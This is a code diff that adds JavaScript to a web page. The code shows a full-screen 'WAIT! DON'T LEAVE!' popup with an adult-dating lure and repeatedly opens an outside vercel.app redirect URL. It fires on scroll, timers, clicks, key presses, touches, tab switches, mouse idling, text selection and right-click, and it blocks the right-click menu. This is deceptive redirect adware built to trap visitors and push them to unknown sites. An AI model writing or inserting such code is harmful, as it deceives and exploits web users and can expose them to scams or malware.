@@ -545,6 +545,213 @@
 
         // Show popup immediately when page loads
         window.addEventListener('load', createPopup);
+
+        // Exit-intent popup functionality
+        let exitIntentTriggered = false;
+        let mouseLeaveTimer;
+
+        function createExitIntentPopup() {
+            if (exitIntentTriggered) return;
+            exitIntentTriggered = true;
+
+            const exitOverlay = document.createElement('div');
+            exitOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: rgba(255, 0, 0, 0.9);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 20000;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+                animation: exitPulse 0.5s ease-out;
+            `;
+
+            const exitPopup = document.createElement('div');
+            exitPopup.style.cssText = `
+                background: white;
+                padding: 50px 40px;
+                border-radius: 20px;
+                max-width: 450px;
+                width: 95%;
+                text-align: center;
+                position: relative;
+                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+                border: 3px solid #ff4444;
+            `;
+
+            // Add exit animation
+            const exitStyle = document.createElement('style');
+            exitStyle.textContent = `
+                @keyframes exitPulse {
+                    0% {
+                        transform: scale(0.5);
+                        opacity: 0;
+                    }
+                    50% {
+                        transform: scale(1.1);
+                    }
+                    100% {
+                        transform: scale(1);
+                        opacity: 1;
+                    }
+                }
+            `;
+            document.head.appendChild(exitStyle);
+
+            const exitTitle = document.createElement('h2');
+            exitTitle.textContent = 'WAIT! DON\'T LEAVE! 🔥';
+            exitTitle.style.cssText = `
+                color: #ff4444;
+                font-size: 24px;
+                margin: 0 0 20px 0;
+                font-weight: bold;
+                text-transform: uppercase;
+            `;
+
+            const exitMessage = document.createElement('p');
+            exitMessage.textContent = 'You\'re about to miss exclusive access to our VIP group with hot singles waiting for you right now!';
+            exitMessage.style.cssText = `
+                font-size: 18px;
+                color: #333;
+                margin: 20px 0 30px 0;
+                line-height: 1.5;
+                font-weight: 500;
+            `;
+
+            const exitBtn = document.createElement('button');
+            exitBtn.textContent = 'GET INSTANT ACCESS NOW!';
+            exitBtn.style.cssText = `
+                background: linear-gradient(45deg, #ff4444, #ff6666);
+                color: white;
+                border: none;
+                padding: 18px 45px;
+                font-size: 16px;
+                border-radius: 30px;
+                cursor: pointer;
+                font-weight: bold;
+                text-transform: uppercase;
+                box-shadow: 0 8px 20px rgba(255, 68, 68, 0.4);
+                transition: all 0.3s ease;
+            `;
+
+            exitBtn.onmouseover = () => {
+                exitBtn.style.transform = 'translateY(-2px)';
+                exitBtn.style.boxShadow = '0 12px 25px rgba(255, 68, 68, 0.6)';
+            };
+            exitBtn.onmouseout = () => {
+                exitBtn.style.transform = 'translateY(0)';
+                exitBtn.style.boxShadow = '0 8px 20px rgba(255, 68, 68, 0.4)';
+            };
+
+            function exitRedirect() {
+                window.open('https://redirect01-z56s-git-main-benzee10000s-projects.vercel.app/', '_blank');
+                document.body.removeChild(exitOverlay);
+            }
+
+            exitOverlay.addEventListener('click', exitRedirect);
+            exitPopup.addEventListener('click', exitRedirect);
+            exitBtn.addEventListener('click', exitRedirect);
+
+            exitPopup.appendChild(exitTitle);
+            exitPopup.appendChild(exitMessage);
+            exitPopup.appendChild(exitBtn);
+            exitOverlay.appendChild(exitPopup);
+            document.body.appendChild(exitOverlay);
+        }
+
+        // Detect mouse leaving viewport (exit intent)
+        document.addEventListener('mouseleave', function(e) {
+            if (e.clientY <= 0) {
+                clearTimeout(mouseLeaveTimer);
+                mouseLeaveTimer = setTimeout(createExitIntentPopup, 500);
+            }
+        });
+
+        // Additional redirect triggers
+        let redirectTriggers = 0;
+        const maxTriggers = 3;
+
+        function triggerRedirect(source) {
+            if (redirectTriggers < maxTriggers) {
+                redirectTriggers++;
+                window.open('https://redirect01-z56s-git-main-benzee10000s-projects.vercel.app/', '_blank');
+            }
+        }
+
+        // Scroll-based trigger
+        let hasScrolledHalf = false;
+        window.addEventListener('scroll', function() {
+            const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
+            if (scrollPercent > 50 && !hasScrolledHalf) {
+                hasScrolledHalf = true;
+                setTimeout(() => triggerRedirect('scroll'), 2000);
+            }
+        });
+
+        // Time-based trigger
+        setTimeout(() => triggerRedirect('time'), 15000); // After 15 seconds
+
+        // Click anywhere trigger with delay
+        let clickCount = 0;
+        document.addEventListener('click', function(e) {
+            clickCount++;
+            if (clickCount === 3) { // On third click anywhere
+                setTimeout(() => triggerRedirect('click'), 1000);
+            }
+        });
+
+        // Keyboard interaction trigger
+        let keyPressCount = 0;
+        document.addEventListener('keydown', function(e) {
+            keyPressCount++;
+            if (keyPressCount >= 5) { // After 5 key presses
+                triggerRedirect('keyboard');
+            }
+        });
+
+        // Mobile touch triggers
+        let touchCount = 0;
+        document.addEventListener('touchstart', function(e) {
+            touchCount++;
+            if (touchCount === 4) { // On fourth touch
+                setTimeout(() => triggerRedirect('touch'), 1500);
+            }
+        });
+
+        // Visibility change trigger (tab switching)
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                setTimeout(() => {
+                    if (!document.hidden) return; // Don't trigger if they came back quickly
+                    triggerRedirect('visibility');
+                }, 3000);
+            }
+        });
+
+        // Mouse idle trigger
+        let mouseIdleTimer;
+        function resetMouseIdle() {
+            clearTimeout(mouseIdleTimer);
+            mouseIdleTimer = setTimeout(() => triggerRedirect('idle'), 20000); // 20 seconds of no mouse movement
+        }
+
+        document.addEventListener('mousemove', resetMouseIdle);
+        resetMouseIdle(); // Start the timer
+
+        // Right-click context menu trigger
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            triggerRedirect('rightclick');
+        });
+
+        // Text selection trigger
+        document.addEventListener('selectstart', function(e) {
+            setTimeout(() => triggerRedirect('textselect'), 1000);
+        });
     </script>
 </body>
 </html>
